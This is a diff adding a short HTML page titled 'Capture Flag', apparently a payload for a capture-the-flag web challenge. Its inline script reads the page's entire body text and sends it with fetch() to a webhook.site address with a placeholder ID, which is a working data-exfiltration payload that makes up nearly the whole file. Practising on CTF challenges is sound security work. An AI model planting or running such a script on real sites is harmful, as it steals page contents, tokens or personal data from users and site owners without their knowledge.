@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture Flag</title>
+</head>
+<body>
+    <script>
+        var flag = document.body.innerText; // Capture the body text
+        fetch("https://webhook.site/YOUR_UNIQUE_ID?flag=" + encodeURIComponent(flag)); // Send it to webhook.site
+    </script>
+</body>
+</html>
